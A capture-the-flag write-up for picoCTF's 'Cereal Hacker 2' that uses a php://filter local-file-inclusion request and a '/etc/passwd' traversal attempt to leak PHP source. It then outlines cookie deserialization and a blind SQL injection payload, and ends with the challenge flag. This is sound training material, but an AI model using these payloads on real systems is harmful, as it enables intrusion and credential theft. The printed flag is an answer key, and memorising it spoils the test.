<h3>Challenge #18 Cereal Hacker 2</h3>
<blockquote>Get the admin's password. https://2019shell1.picoctf.com/problem/62195/ or http://2019shell1.picoctf.com:62195</blockquote>

Same login page as in Cereal Hacker 1.<br>I could have use some of the pentesting tools for scanning vulnerabilities , but I was doing this manually. I started for searching for LFI/RFI and to access for example <code>../../../../etc/passwd</code>. <br>The file wasn't found but i saw that it is appending .php extension at the end as a message. So that means we can actually get to the local files ,or the inclusion was done by using most likely require_once php method. One of the solutions to get to certain file was using <code>php://filter/convert.base64_encode/resource</code> . With this I am able to see any php file that is out there by outputing b64 , before it's being used by require_once method. <br> So first I tried with <blockquote>https://2019shell1.picoctf.com/problem/62195/index.php?file=php://filter/convert.base64-encode/resource=admin</blockquote>
<br>
And that gave me base64 output , after decoding b64 we've got code from admin.php which looked like this : 

```php

 <?php

require_once('cookie.php');

if(isset($perm) && $perm->is_admin()){
?>
	
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">Welcome to the admin page!</h5>
							<h5 style="color:blue" class="text-center">Flag: Find the admin's password!</h5>
						</div>
					</div>
				</div>
			</div>
		</div>

	</body>

<?php
}
else{
?>
	
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">You are not admin!</h5>
							<form action="index.php" method="get">
								<button class="btn btn-lg btn-primary btn-block text-uppercase" name="file" value="login" type="submit" onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>

	</body>

<?php
}
?>

```
<br>
We can see that is using require_once for cookie.php so I just followed the same steps for all the things that I could get. And I've got to the source code of DB query : <br>

```php
https://2019shell1.picoctf.com/problem/62195/index.php?file=php://filter/convert.base64-encode/resource=cookie
require_once('../sql_connect.php');

// I got tired of my php sessions expiring, so I just put all my useful information in a serialized cookie
class permissions
{
	public $username;
	public $password;
	
	function __construct($u, $p){
		$this->username = $u;
		$this->password = $p;
	}

	function is_admin(){
		global $sql_conn;
		if($sql_conn->connect_errno){
			die('Could not connect');
		}
		//$q = 'SELECT admin FROM pico_ch2.users WHERE username = \''.$this->username.'\' AND (password = \''.$this->password.'\');';
		
		if (!($prepared = $sql_conn->prepare("SELECT admin FROM pico_ch2.users WHERE username = ? AND password = ?;"))) {
		    die("SQL error");
		}

		$prepared->bind_param('ss', $this->username, $this->password);
	
		if (!$prepared->execute()) {
		    die("SQL error");
		}
		
		if (!($result = $prepared->get_result())) {
		    die("SQL error");
		}

		$r = $result->fetch_all();
		if($result->num_rows !== 1){
			$is_admin_val = 0;
		}
		else{
			$is_admin_val = (int)$r[0][0];
		}
		
		$sql_conn->close();
		return $is_admin_val;
	}
}

/* legacy login */
class siteuser
{
	public $username;
	public $password;
	
	function __construct($u, $p){
		$this->username = $u;
		$this->password = $p;
	}

	function is_admin(){
		global $sql_conn;
		if($sql_conn->connect_errno){
			die('Could not connect');
		}
		$q = 'SELECT admin FROM pico_ch2.users WHERE admin = 1 AND username = \''.$this->username.'\' AND (password = \''.$this->password.'\');';
		
		$result = $sql_conn->query($q);
		if($result->num_rows != 1){
			$is_user_val = 0;
		}
		else{
			$is_user_val = 1;
		}
		
		$sql_conn->close();
		return $is_user_val;
	}
}


if(isset($_COOKIE['user_info'])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE['user_info'])));
	}
	catch(Exception $except){
		die('Deserialization error.');
	}
}

?>
```
So here we have our db logic query, we can see that there is an old permission class that we were using in previous challenge but we can see siteuser class now . The difference is that siteuser class is not using prepared for sanitization , since there are two classes we can still exploit that siteuser. And it is still using unserialize, <a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">unserialize exploit.</a>
So this is going to be error-based / blind sql injection. We can make script for this and try to match password by checking character by character , if the character of password that we are trying to guess is right one we should get Welcome to admin page if not it should give us You are not an admin page.Check the <a href="">script</a>.<br>
Using <code>' or password like BINARY ' = "c%"</code> is going to check if the password is checking with character that we are trying to guess and if it does we are gonna concat it and provide that character as the first and so on till we get the flag. 

<b>FLAG : picoCTF{c9f6ad462c6bb64a53c6e7a6452a6eb7} </b>